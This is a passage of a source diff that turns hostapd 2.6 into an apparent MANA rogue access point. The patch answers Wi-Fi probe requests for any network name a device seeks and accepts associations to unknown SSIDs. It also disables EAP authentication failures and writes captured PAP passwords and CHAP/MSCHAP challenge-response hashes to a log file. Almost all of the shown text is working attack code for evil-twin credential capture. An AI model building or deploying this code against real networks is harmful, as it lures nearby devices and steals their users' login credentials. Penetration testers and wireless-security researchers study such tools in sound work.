+ 		wpa_printf(MSG_MSGDUMP, "Probe Request from " MACSTR " for "
+ 			   "broadcast SSID ignored", MAC2STR(mgmt->sa));
+ 		return;
+@@ -803,22 +854,21 @@
+ #endif /* CONFIG_P2P */
+ 
+ #ifdef CONFIG_TAXONOMY
+-	{
+-		struct sta_info *sta;
+-		struct hostapd_sta_info *info;
+-
+-		if ((sta = ap_get_sta(hapd, mgmt->sa)) != NULL) {
+-			taxonomy_sta_info_probe_req(hapd, sta, ie, ie_len);
+-		} else if ((info = sta_track_get(hapd->iface,
+-						 mgmt->sa)) != NULL) {
+-			taxonomy_hostapd_sta_info_probe_req(hapd, info,
+-							    ie, ie_len);
+-		}
++	struct sta_info *sta;
++	struct hostapd_sta_info *info;
++
++	if ((sta = ap_get_sta(hapd, mgmt->sa)) != NULL) {
++		taxonomy_sta_info_probe_req(hapd, sta, ie, ie_len);
++	} else if ((info = sta_track_get(hapd->iface,
++					 mgmt->sa)) != NULL) {
++		taxonomy_hostapd_sta_info_probe_req(hapd, info,
++						    ie, ie_len);
+ 	}
+ #endif /* CONFIG_TAXONOMY */
+ 
+ 	res = ssid_match(hapd, elems.ssid, elems.ssid_len,
+ 			 elems.ssid_list, elems.ssid_list_len);
++	/*
+ 	if (res == NO_SSID_MATCH) {
+ 		if (!(mgmt->da[0] & 0x01)) {
+ 			wpa_printf(MSG_MSGDUMP, "Probe Request from " MACSTR
+@@ -830,6 +880,107 @@
+ 		}
+ 		return;
+ 	}
++	*/
++	// MANA START
++	// todo handle ssid_list see ssid_match for code
++	// todo change emit code below (global flag?)
++	// todo grab taxonomy info for output
++	if (res == EXACT_SSID_MATCH) { //Probed for configured address
++		if (hapd->iconf->enable_mana) {
++			wpa_printf(MSG_INFO,"MANA - Directed probe request for actual/legitimate SSID '%s' from " MACSTR "",wpa_ssid_txt(elems.ssid, elems.ssid_len),MAC2STR(mgmt->sa));
++		}
++#ifdef CONFIG_TAXONOMY
++	if (sta) {
++		//sta->ssid_probe = &hapd->conf->ssid;
++		sta->ssid_probe_mana = &hapd->conf->ssid;
++		}
++#endif /* CONFIG_TAXONOMY */
++	} else if (res == NO_SSID_MATCH) { //Probed for unseen SSID
++		wpa_printf(MSG_INFO,"MANA - Directed probe request for foreign SSID '%s' from " MACSTR "",wpa_ssid_txt(elems.ssid, elems.ssid_len),MAC2STR(mgmt->sa));
++		if (hapd->iconf->enable_mana) {
++#ifdef CONFIG_TAXONOMY
++			if (sta) {
++				// Make hostapd think they probed for us, necessary for security policy
++				//sta->ssid_probe = &hapd->conf->ssid;
++				// Store what was actually probed for
++				sta->ssid_probe_mana = (struct hostapd_ssid*)os_malloc(sizeof(struct hostapd_ssid));
++				os_memcpy(sta->ssid_probe_mana,&hapd->conf->ssid,sizeof(hapd->conf->ssid));
++				os_memcpy(sta->ssid_probe_mana->ssid, elems.ssid, elems.ssid_len);
++				sta->ssid_probe_mana->ssid[elems.ssid_len] = '\0';
++				sta->ssid_probe_mana->ssid_len = elems.ssid_len;
++			}
++#endif /* CONFIG_TAXONOMY */
++
++			if (hapd->iconf->mana_loud) {
++				// Loud mode; Check if the SSID probed for is in the hash for this STA
++				struct mana_ssid *d = NULL;
++				HASH_FIND_STR(mana_ssidhash, wpa_ssid_txt(elems.ssid, elems.ssid_len), d);
++				if (d == NULL) {
++					wpa_printf(MSG_DEBUG, "MANA - Adding SSID %s(%d) for STA " MACSTR " to the hash.", wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len, MAC2STR(mgmt->sa));
++					d = (struct mana_ssid*)os_malloc(sizeof(struct mana_ssid));
++					os_memcpy(d->ssid_txt, wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len+1);
++					os_memcpy(d->ssid, elems.ssid, elems.ssid_len);
++					d->ssid_len = elems.ssid_len;
++					//os_memcpy(d->sta_addr, mgmt->sa, ETH_ALEN);
++					HASH_ADD_STR(mana_ssidhash, ssid_txt, d);
++
++					log_ssid(elems.ssid, elems.ssid_len, mgmt->sa);
++				}
++			} else { //Not loud mode, Check if the STA probing is in our hash
++				struct mana_mac *newsta = NULL;
++				//char strmac[18];
++				//snprintf(strmac, sizeof(strmac), MACSTR, MAC2STR(mgmt->sa));
++				HASH_FIND(hh,mana_machash, mgmt->sa, 6, newsta);
++
++				if (newsta == NULL) { //MAC not seen before adding to hash
++					wpa_printf(MSG_DEBUG, "MANA - Adding SSID %s(%d) for STA " MACSTR " to the hash.", wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len, MAC2STR(mgmt->sa));
++					//Add STA	
++					newsta = (struct mana_mac*)os_malloc(sizeof(struct mana_mac));
++					os_memcpy(newsta->sta_addr, mgmt->sa, ETH_ALEN);
++					//os_memcpy(newsta->mac_txt, strmac, sizeof(strmac));
++					newsta->ssids = NULL;
++					HASH_ADD(hh,mana_machash, sta_addr, 6, newsta);
++					//Add SSID to subhash
++					struct mana_ssid *newssid = os_malloc(sizeof(struct mana_ssid));
++					os_memcpy(newssid->ssid_txt, wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len+1);
++					os_memcpy(newssid->ssid, elems.ssid, elems.ssid_len);
++					newssid->ssid_len = elems.ssid_len;
++					HASH_ADD_STR(newsta->ssids, ssid_txt, newssid);
++
++					log_ssid(elems.ssid, elems.ssid_len, mgmt->sa);
++				} else { //Seen MAC, check if SSID is new
++					// Check if the SSID probed for is in the hash for this STA
++					struct mana_ssid *newssid = NULL;
++					HASH_FIND_STR(newsta->ssids, wpa_ssid_txt(elems.ssid, elems.ssid_len), newssid);
++					if (newssid == NULL) { //SSID not found, add to sub hash
++						newssid = (struct mana_ssid*)os_malloc(sizeof(struct mana_ssid));
++						os_memcpy(newssid->ssid_txt, wpa_ssid_txt(elems.ssid, elems.ssid_len), elems.ssid_len+1);
++						os_memcpy(newssid->ssid, elems.ssid, elems.ssid_len);
++						newssid->ssid_len = elems.ssid_len;
++						HASH_ADD_STR(newsta->ssids, ssid_txt, newssid);
++
++						log_ssid(elems.ssid, elems.ssid_len, mgmt->sa);
++					}
++				}
++			}
++		} else { //No SSID Match and no mana behave as normal
++			if (!(mgmt->da[0] & 0x01)) {
++				wpa_printf(MSG_DEBUG, "Probe Request from " MACSTR
++				   " for foreign SSID '%s' (DA " MACSTR ")%s",
++				   MAC2STR(mgmt->sa),
++				   wpa_ssid_txt(elems.ssid, elems.ssid_len),
++				   MAC2STR(mgmt->da),
++				   elems.ssid_list ? " (SSID list)" : "");
++			}
++			return;
++		}
++	} else { //Probed for wildcard i.e. WILDCARD_SSID_MATCH
++		if (hapd->iconf->enable_mana) {
++			wpa_printf(MSG_DEBUG,"MANA - Broadcast probe request from " MACSTR "",MAC2STR(mgmt->sa));
++			iterate = 1; //iterate through hash emitting multiple probe responses
++		}
++	}
++ //MANA END
+ 
+ #ifdef CONFIG_INTERWORKING
+ 	if (hapd->conf->interworking &&
+@@ -909,7 +1060,8 @@
+ 	}
+ #endif /* CONFIG_TESTING_OPTIONS */
+ 
+-	resp = hostapd_gen_probe_resp(hapd, mgmt, elems.p2p != NULL,
++	//resp = hostapd_gen_probe_resp(hapd, mgmt, elems.p2p != NULL,
++	resp = hostapd_gen_probe_resp(hapd, elems.ssid, elems.ssid_len, mgmt, elems.p2p != NULL, //MANA
+ 				      &resp_len);
+ 	if (resp == NULL)
+ 		return;
+@@ -941,6 +1093,53 @@
+ 
+ 	os_free(resp);
+ 
++	// MANA START
++	if (iterate) { // Only iterate through the hash if this is set
++		struct ieee80211_mgmt *resp2;
++		size_t resp2_len;
++		struct mana_ssid *k;
++		if (hapd->iconf->mana_loud) {
++			for ( k = mana_ssidhash; k != NULL; k = (struct mana_ssid*)(k->hh.next)) {
++				wpa_printf(MSG_DEBUG, "MANA - Attempting to generate LOUD Broadcast response : %s (%zu) for STA " MACSTR, k->ssid_txt, k->ssid_len, MAC2STR(mgmt->sa));
++				resp2 = (struct ieee80211_mgmt*)hostapd_gen_probe_resp(hapd, k->ssid, k->ssid_len, mgmt, elems.p2p != NULL, &resp2_len);
++				if (resp2 == NULL) {
++					wpa_printf(MSG_ERROR, "MANA - Could not generate SSID response for %s (%zu)", k->ssid_txt, k->ssid_len);
++				} else {
++					wpa_printf(MSG_DEBUG, "MANA - Successfully generated SSID response for %s (len %zu) to station : " MACSTR, k->ssid_txt, k->ssid_len, MAC2STR(resp2->da)); 
++					if (hostapd_drv_send_mlme_csa(hapd, resp2, resp2_len, noack, 
++									csa_offs_len ? csa_offs : NULL,
++									csa_offs_len) < 0) {
++						wpa_printf(MSG_ERROR, "MANA - Failed sending probe response for SSID %s (%zu)", k->ssid_txt, k->ssid_len);
++					}
++					os_free(resp2);
++				}
++			}
++		} else { //Not loud mode, only send for one mac
++			struct mana_mac *newsta = NULL;
++			char strmac[18];
++			snprintf(strmac, sizeof(strmac), MACSTR, MAC2STR(mgmt->sa));
++			HASH_FIND(hh, mana_machash, mgmt->sa, 6, newsta);
++			if (newsta != NULL) { 
++				for ( k = newsta->ssids; k != NULL; k = (struct mana_ssid*)(k->hh.next)) {
++					wpa_printf(MSG_INFO, "MANA - Attempting to generated Broadcast response : %s (%zu) for STA %s", k->ssid_txt, k->ssid_len, strmac);
++					resp2 = (struct ieee80211_mgmt*)hostapd_gen_probe_resp(hapd, k->ssid, k->ssid_len, mgmt, elems.p2p != NULL, &resp2_len);
++					if (resp2 == NULL) {
++						wpa_printf(MSG_ERROR, "MANA - Could not generate SSID response for %s (%zu)", k->ssid_txt, k->ssid_len);
++					} else {
++						wpa_printf(MSG_DEBUG, "MANA - Successfully generated SSID response for %s (len %zu) to station : " MACSTR, k->ssid_txt, k->ssid_len, MAC2STR(resp2->da)); 
++						if (hostapd_drv_send_mlme_csa(hapd, resp2, resp2_len, noack,
++										csa_offs_len ? csa_offs : NULL,
++										csa_offs_len) < 0) {
++							wpa_printf(MSG_ERROR, "MANA - Failed sending prove response for SSID %s (%zu)", k->ssid_txt, k->ssid_len);
++						}
++						os_free(resp2);
++					}
++				}
++			}
++		}
++	}
++	// MANA END
++
+ 	wpa_printf(MSG_EXCESSIVE, "STA " MACSTR " sent probe request for %s "
+ 		   "SSID", MAC2STR(mgmt->sa),
+ 		   elems.ssid_len == 0 ? "broadcast" : "our");
+@@ -979,7 +1178,8 @@
+ 			   "this");
+ 
+ 	/* Generate a Probe Response template for the non-P2P case */
+-	return hostapd_gen_probe_resp(hapd, NULL, 0, resp_len);
++	//return hostapd_gen_probe_resp(hapd, NULL, 0, resp_len);
++	return hostapd_gen_probe_resp(hapd, NULL, 0, NULL, 0, resp_len); //MANA
+ }
+ 
+ #endif /* NEED_AP_MLME */
+@@ -1331,7 +1531,19 @@
+ 		params.freq = &freq;
+ 
+ 	res = hostapd_drv_set_ap(hapd, &params);
+-	hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
++	//  MANA - Start Beacon Stuffs here
++	//hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
++	//struct wpa_driver_ap_params params2 = params;
++	//os_memset(&params2.ssid, 0, params2.ssid_len);
++	//params2.hide_ssid = HIDDEN_SSID_ZERO_CONTENTS;
++	//hostapd_build_ap_extra_ies(hapd, &beacon, &proberesp, &assocresp);
++	//params2.beacon_ies = beacon;
++	//params2.proberesp_ies = proberesp;
++   //params2.assocresp_ies = assocresp;
++	//wpa_printf(MSG_INFO, "ZZZZ : Sending Hidden AP: %s", params2.ssid);
++	//res = hostapd_drv_set_ap(hapd, &params2);
++	//hostapd_free_ap_extra_ies(hapd, beacon, proberesp, assocresp);
++	//  MANA - End Beacon Stuffs here
+ 	if (res)
+ 		wpa_printf(MSG_ERROR, "Failed to set beacon parameters");
+ 	else
+diff -ur hostapd-2.6/src/ap/beacon.h hostapd-2.6-mana/src/ap/beacon.h
+--- hostapd-2.6/src/ap/beacon.h	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/beacon.h	2016-12-13 01:23:11.000000000 +0200
+@@ -31,3 +31,23 @@
+ 				   struct wpabuf **probe_ie_taxonomy);
+ 
+ #endif /* BEACON_H */
++
++// MANA START
++#include "uthash.h"
++struct mana_ssid {
++        char ssid_txt[SSID_MAX_LEN+1];
++        u8 ssid[SSID_MAX_LEN];
++        size_t ssid_len;
++		//u8 sta_addr[6];
++        UT_hash_handle hh;
++};
++//struct mana_ssid *mana_data;
++struct mana_mac {
++	//char mac_txt[18];
++	u8 sta_addr[6];
++	struct mana_ssid *ssids;
++	UT_hash_handle hh;
++};
++struct mana_mac *mana_machash;
++struct mana_ssid *mana_ssidhash;
++// MANA END
+diff -ur hostapd-2.6/src/ap/drv_callbacks.c hostapd-2.6-mana/src/ap/drv_callbacks.c
+--- hostapd-2.6/src/ap/drv_callbacks.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/drv_callbacks.c	2016-12-12 23:32:02.000000000 +0200
+@@ -827,7 +827,7 @@
+ 		return HAPD_BROADCAST;
+ 
+ 	for (i = 0; i < iface->num_bss; i++) {
+-		if (os_memcmp(bssid, iface->bss[i]->own_addr, ETH_ALEN) == 0)
++		if (os_memcmp(bssid, iface->bss[i]->own_addr, ETH_ALEN) == 0) 
+ 			return iface->bss[i];
+ 	}
+ 
+diff -ur hostapd-2.6/src/ap/ieee802_11.c hostapd-2.6-mana/src/ap/ieee802_11.c
+--- hostapd-2.6/src/ap/ieee802_11.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/ieee802_11.c	2016-12-12 23:32:02.000000000 +0200
+@@ -1417,17 +1417,21 @@
+ {
+ 	if (ssid_ie == NULL)
+ 		return WLAN_STATUS_UNSPECIFIED_FAILURE;
+-
+-	if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
+-	    os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
+-		hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
+-			       HOSTAPD_LEVEL_INFO,
+-			       "Station tried to associate with unknown SSID "
+-			       "'%s'", wpa_ssid_txt(ssid_ie, ssid_ie_len));
+-		return WLAN_STATUS_UNSPECIFIED_FAILURE;
+-	}
++	if (hapd->iconf->enable_mana) {
++		wpa_printf(MSG_MSGDUMP, "MANA - Checking SSID for start of association, pass through %s", wpa_ssid_txt(ssid_ie, ssid_ie_len));
++		return WLAN_STATUS_SUCCESS;
++	} else {
++		if (ssid_ie_len != hapd->conf->ssid.ssid_len ||
++			os_memcmp(ssid_ie, hapd->conf->ssid.ssid, ssid_ie_len) != 0) {
++			hostapd_logger(hapd, sta->addr, HOSTAPD_MODULE_IEEE80211,
++					   HOSTAPD_LEVEL_INFO,
++					   "Station tried to associate with unknown SSID "
++					   "'%s'", wpa_ssid_txt(ssid_ie, ssid_ie_len));
++			return WLAN_STATUS_UNSPECIFIED_FAILURE;
++		}
+ 
+ 	return WLAN_STATUS_SUCCESS;
++	}
+ }
+ 
+ 
+@@ -2853,6 +2857,16 @@
+ 		 * step.
+ 		 */
+ 		ap_sta_set_authorized(hapd, sta, 1);
++
++		// Print that it has associated and give the MAC and AP
++		if (hapd->iconf->enable_mana && sta->ssid_probe_mana) {
++			struct hostapd_ssid *ssid = sta->ssid_probe_mana;
++
++			 wpa_printf(MSG_INFO,"MANA - Successful association of " MACSTR " to ESSID '%s'\n",
++				   MAC2STR(mgmt->da), ssid->ssid);
++		}
++
++		// MANA END
+ 	}
+ 
+ 	if (reassoc)
+diff -ur hostapd-2.6/src/ap/sta_info.h hostapd-2.6-mana/src/ap/sta_info.h
+--- hostapd-2.6/src/ap/sta_info.h	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/ap/sta_info.h	2016-12-13 00:55:39.000000000 +0200
+@@ -218,6 +218,7 @@
+ 	struct wpabuf *probe_ie_taxonomy;
+ 	struct wpabuf *assoc_ie_taxonomy;
+ #endif /* CONFIG_TAXONOMY */
++	struct hostapd_ssid *ssid_probe_mana; //MANA
+ };
+ 
+ 
+Only in hostapd-2.6-mana/src/ap: uthash
+diff -ur hostapd-2.6/src/eap_server/eap_server.c hostapd-2.6-mana/src/eap_server/eap_server.c
+--- hostapd-2.6/src/eap_server/eap_server.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/eap_server/eap_server.c	2016-12-12 23:32:02.000000000 +0200
+@@ -23,7 +23,7 @@
+ #define STATE_MACHINE_DATA struct eap_sm
+ #define STATE_MACHINE_DEBUG_PREFIX "EAP"
+ 
+-#define EAP_MAX_AUTH_ROUNDS 50
++#define EAP_MAX_AUTH_ROUNDS 50000 //MANA
+ 
+ static void eap_user_free(struct eap_user *user);
+ 
+@@ -163,27 +163,47 @@
+ 		 int phase2)
+ {
+ 	struct eap_user *user;
++	struct eap_user *user2;
++	char ident = 't';
++
++	wpa_printf(MSG_INFO, "MANA (EAP) : identity: %.*s", identity_len, identity);
+ 
+ 	if (sm == NULL || sm->eapol_cb == NULL ||
+-	    sm->eapol_cb->get_eap_user == NULL)
++	    sm->eapol_cb->get_eap_user == NULL) {
+ 		return -1;
++	}
+ 
+ 	eap_user_free(sm->user);
+ 	sm->user = NULL;
+-
+ 	user = os_zalloc(sizeof(*user));
+-	if (user == NULL)
++	if (user == NULL) {
+ 	    return -1;
+-
++	}
++	user2 = os_zalloc(sizeof(*user2));
++	if (user2 == NULL) {
++		return -1;
++	}
++	if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity, identity_len, phase2, user2) != 0) {
++		user2 = NULL;
++	}
++	if(phase2) {
++		identity = (const u8 *)&ident;
++		identity_len = 1;
++	}
+ 	if (sm->eapol_cb->get_eap_user(sm->eapol_ctx, identity,
+ 				       identity_len, phase2, user) != 0) {
+ 		eap_user_free(user);
+ 		return -1;
+ 	}
++	if (user2 != NULL) {
++		user->password = user2->password;
++		user->password_len = user2->password_len;
++	}
+ 
+ 	sm->user = user;
+ 	sm->user_eap_method_index = 0;
+ 
++
+ 	return 0;
+ }
+ 
+diff -ur hostapd-2.6/src/eap_server/eap_server_fast.c hostapd-2.6-mana/src/eap_server/eap_server_fast.c
+--- hostapd-2.6/src/eap_server/eap_server_fast.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/eap_server/eap_server_fast.c	2016-12-12 23:32:02.000000000 +0200
+@@ -1043,7 +1043,8 @@
+ 
+ 	switch (data->state) {
+ 	case PHASE2_ID:
+-		if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
++		//if (eap_user_get(sm, sm->identity, sm->identity_len, 1) != 0) {
++		if (eap_user_get(sm, sm->identity, sm->identity_len, 0) != 0) {
+ 			wpa_hexdump_ascii(MSG_DEBUG, "EAP-FAST: Phase2 "
+ 					  "Identity not found in the user "
+ 					  "database",
+diff -ur hostapd-2.6/src/eap_server/eap_server_mschapv2.c hostapd-2.6-mana/src/eap_server/eap_server_mschapv2.c
+--- hostapd-2.6/src/eap_server/eap_server_mschapv2.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/eap_server/eap_server_mschapv2.c	2016-12-12 23:32:02.000000000 +0200
+@@ -12,7 +12,7 @@
+ #include "crypto/ms_funcs.h"
+ #include "crypto/random.h"
+ #include "eap_i.h"
+-
++#include <stdlib.h>
+ 
+ struct eap_mschapv2_hdr {
+ 	u8 op_code; /* MSCHAPV2_OP_* */
+@@ -287,9 +287,11 @@
+ 	u8 flags;
+ 	size_t len, name_len, i;
+ 	u8 expected[24];
++  	u8 challenge_hash1[8];
+ 	const u8 *username, *user;
+ 	size_t username_len, user_len;
+ 	int res;
++	int x;
+ 	char *buf;
+ 
+ 	pos = eap_hdr_validate(EAP_VENDOR_IETF, EAP_TYPE_MSCHAPV2, respData,
+@@ -373,6 +375,39 @@
+ 	}
+ #endif /* CONFIG_TESTING_OPTIONS */
+ 
++	//MANA EAP capture
++	challenge_hash(peer_challenge, data->auth_challenge, username, username_len, challenge_hash1);
++
++	wpa_hexdump(MSG_DEBUG, "EAP-MSCHAPV2: Challenge Hash", challenge_hash1, 8);
++	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Username:%s", name);
++	wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Challenge");
++	printf("MANA (EAP-FAST) : ");
++	for (x=0;x<7;x++)
++                printf("%02x:",challenge_hash1[x]);
++        printf("%02x\n",challenge_hash1[7]);
++
++        wpa_printf(MSG_INFO, "MANA (EAP-FAST) : Response");
++        printf("MANA (EAP-FAST) : ");
++        for (x=0;x<23;x++)
++                printf("%02x:",nt_response[x]);
++        printf("%02x\n",nt_response[23]);
++
++	char *ennode = getenv("MANANODE");
++	FILE *f = fopen(ennode, "a");
++	if (f != NULL) {
++		const char *hdr = "CHAP";
++		fprintf(f, "%s|%s|", hdr, name);
++		for (x = 0; x < 7; x++) {
++			fprintf(f, "%02x:", challenge_hash1[x]);
++		}
++		fprintf(f, "%02x|", challenge_hash1[7]);
++		for (x = 0; x < 23; x++) {
++			fprintf(f, "%02x:", nt_response[x]);
++		}
++		fprintf(f, "%02x\n", nt_response[23]);
++		fclose(f);
++	}
++
+ 	if (username_len != user_len ||
+ 	    os_memcmp(username, user, username_len) != 0) {
+ 		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Mismatch in user names");
+@@ -438,7 +473,7 @@
+ 			return;
+ 		}
+ 		data->master_key_valid = 1;
+-		wpa_hexdump_key(MSG_DEBUG, "EAP-MSCHAPV2: Derived Master Key",
++		wpa_hexdump_key(MSG_INFO, "EAP-MSCHAPV2: Derived Master Key",
+ 				data->master_key, MSCHAPV2_KEY_LEN);
+ 	} else {
+ 		wpa_hexdump(MSG_MSGDUMP, "EAP-MSCHAPV2: Expected NT-Response",
+@@ -509,9 +544,6 @@
+ 	struct eap_mschapv2_data *data = priv;
+ 
+ 	if (sm->user == NULL || sm->user->password == NULL) {
+-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Password not configured");
+-		data->state = FAILURE;
+-		return;
+ 	}
+ 
+ 	switch (data->state) {
+diff -ur hostapd-2.6/src/eap_server/eap_server_ttls.c hostapd-2.6-mana/src/eap_server/eap_server_ttls.c
+--- hostapd-2.6/src/eap_server/eap_server_ttls.c	2016-10-02 20:51:11.000000000 +0200
++++ hostapd-2.6-mana/src/eap_server/eap_server_ttls.c	2016-12-13 01:08:21.000000000 +0200
+@@ -534,16 +534,24 @@
+ 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_PAP)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: No plaintext user "
+ 			   "password configured");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	if (sm->user->password_len != user_password_len ||
+ 	    os_memcmp_const(sm->user->password, user_password,
+ 			    user_password_len) != 0) {
+-		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Invalid user password: %s", user_password);
++		//thanks gcp
++		char *ennode = getenv("MANANODE");
++		FILE *f = fopen(ennode, "a");
++		if (f != NULL) {
++			const char *hdr = "PAP";
++			fprintf(f, "%s|%*.*s|%s\n", hdr, 0, sm->identity_len, sm->identity, user_password);
++			fclose(f);
++		}
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	wpa_printf(MSG_DEBUG, "EAP-TTLS/PAP: Correct user password");
+@@ -568,16 +576,16 @@
+ 			   "(challenge len %lu password len %lu)",
+ 			   (unsigned long) challenge_len,
+ 			   (unsigned long) password_len);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	if (!sm->user || !sm->user->password || sm->user->password_hash ||
+ 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_CHAP)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/CHAP: No plaintext user "
+ 			   "password configured");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	chal = eap_ttls_implicit_challenge(sm, data,
+@@ -593,9 +601,9 @@
+ 	    != 0 ||
+ 	    password[0] != chal[EAP_TTLS_CHAP_CHALLENGE_LEN]) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/CHAP: Challenge mismatch");
+-		os_free(chal);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//os_free(chal);
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 	os_free(chal);
+ 
+@@ -603,6 +611,36 @@
+ 	chap_md5(password[0], sm->user->password, sm->user->password_len,
+ 		 challenge, challenge_len, hash);
+ 
++	wpa_hexdump(MSG_DEBUG, "MANA EAP-TTLS-CHAP: Challenge Hash", hash, CHAP_MD5_LEN);
++	wpa_printf(MSG_INFO, "MANA (EAP-TTLS-CHAP) : Username:%s", sm->identity);
++	printf("MANA (EAP-TTLS-CHAP) : ");
++	int x;
++	for (x=0;x<CHAP_MD5_LEN;x++)
++                printf("%02x:",hash[x]);
++        printf("%02x\n",hash[CHAP_MD5_LEN-1]);
++
++        wpa_printf(MSG_INFO, "MANA (EAP-TTLS-CHAP) : Response");
++        printf("MANA (EAP-TTLS-CHAP) : ");
++        for (x=0;x<password_len;x++)
++                printf("%02x:",password[x]);
++        printf("%02x\n",password[password_len]);
++
++	char *ennode = getenv("MANANODE");
++	FILE *f = fopen(ennode, "a");
++	if (f != NULL) {
++		const char *hdr = "CHAP";
++		fprintf(f, "%s|%s|", hdr, sm->identity);
++		for (x = 0; x < CHAP_MD5_LEN; x++) {
++			fprintf(f, "%02x:", hash[x]);
++		}
++		fprintf(f, "%02x|", hash[CHAP_MD5_LEN-1]);
++		for (x = 0; x < password_len; x++) {
++			fprintf(f, "%02x:", password[x]);
++		}
++		fprintf(f, "%02x\n", password[password_len]);
++		fclose(f);
++	}
++
+ 	if (os_memcmp_const(hash, password + 1, EAP_TTLS_CHAP_PASSWORD_LEN) ==
+ 	    0) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/CHAP: Correct user password");
+@@ -612,6 +650,7 @@
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/CHAP: Invalid user password");
+ 		eap_ttls_state(data, FAILURE);
+ 	}
++
+ }
+ 
+ 
+@@ -629,16 +668,16 @@
+ 			   "attributes (challenge len %lu response len %lu)",
+ 			   (unsigned long) challenge_len,
+ 			   (unsigned long) response_len);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	if (!sm->user || !sm->user->password ||
+ 	    !(sm->user->ttls_auth & EAP_TTLS_AUTH_MSCHAP)) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAP: No user password "
+ 			   "configured");
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	chal = eap_ttls_implicit_challenge(sm, data,
+@@ -660,9 +699,9 @@
+ 	    != 0 ||
+ 	    response[0] != chal[EAP_TTLS_MSCHAP_CHALLENGE_LEN]) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAP: Challenge mismatch");
+-		os_free(chal);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//os_free(chal);
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 	os_free(chal);
+ 
+@@ -672,6 +711,36 @@
+ 		nt_challenge_response(challenge, sm->user->password,
+ 				      sm->user->password_len, nt_response);
+ 
++	wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAP) : Username:%s", sm->identity);
++	wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAP) : Challenge");
++	printf("MANA (EAP-TTLS-MSCHAP) : ");
++	int x;
++	for (x=0;x<challenge_len;x++)
++                printf("%02x:",challenge[x]);
++        printf("%02x\n",challenge[challenge_len]);
++
++        wpa_printf(MSG_INFO, "MANA (EAP-TTLS-MSCHAP) : Response");
++        printf("MANA (EAP-TTLS-MSCHAP) : ");
++        for (x=0;x<23;x++)
++                printf("%02x:",nt_response[x]);
++        printf("%02x\n",nt_response[23]);
++
++	char *ennode = getenv("MANANODE");
++	FILE *f = fopen(ennode, "a");
++	if (f != NULL) {
++		const char *hdr = "CHAP";
++		fprintf(f, "%s|%s|", hdr, sm->identity);
++		for (x = 0; x < challenge_len; x++) {
++			fprintf(f, "%02x:", challenge[x]);
++		}
++		fprintf(f, "%02x|", challenge[challenge_len]);
++		for (x = 0; x < 23; x++) {
++			fprintf(f, "%02x:", nt_response[x]);
++		}
++		fprintf(f, "%02x\n", nt_response[23]);
++		fclose(f);
++	}
++
+ 	if (os_memcmp_const(nt_response, response + 2 + 24, 24) == 0) {
+ 		wpa_printf(MSG_DEBUG, "EAP-TTLS/MSCHAP: Correct response");
+ 		eap_ttls_state(data, SUCCESS);
+@@ -694,7 +763,7 @@
+ 					     u8 *response, size_t response_len)
+ {
+ 	u8 *chal, *username, nt_response[24], *rx_resp, *peer_challenge,
+-		*auth_challenge;
++		*auth_challenge, challenge_hash1[8];
+ 	size_t username_len, i;
+ 
+ 	if (challenge == NULL || response == NULL ||
+@@ -704,23 +773,23 @@
+ 			   "attributes (challenge len %lu response len %lu)",
+ 			   (unsigned long) challenge_len,
+ 			   (unsigned long) response_len);
+-		eap_ttls_state(data, FAILURE);
+-		return;
++		//eap_ttls_state(data, FAILURE);
++		//return;
+ 	}
+ 
+ 	if (!sm->user || !sm->user->password ||
